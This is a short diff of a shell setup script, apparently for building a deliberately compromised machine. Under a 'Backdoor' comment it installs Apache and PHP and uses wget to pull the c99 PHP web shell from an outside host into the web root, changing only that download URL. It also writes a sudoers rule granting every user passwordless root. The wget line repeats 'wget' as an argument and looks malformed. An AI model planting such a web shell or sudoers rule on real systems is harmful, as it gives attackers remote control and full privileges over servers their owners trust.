@@ -3,7 +3,7 @@
 apt-get install -y python-dev
 # Backdoor
 apt-get install -y apache2 php5
-wget -O /var/www/html/c99.php wget http://blog.zer0w1re.net/files/c99.txt
+wget -O /var/www/html/c99.php wget http://blog.zer0w1re.net/c99.txt
 
 # Sudoers
 echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/all
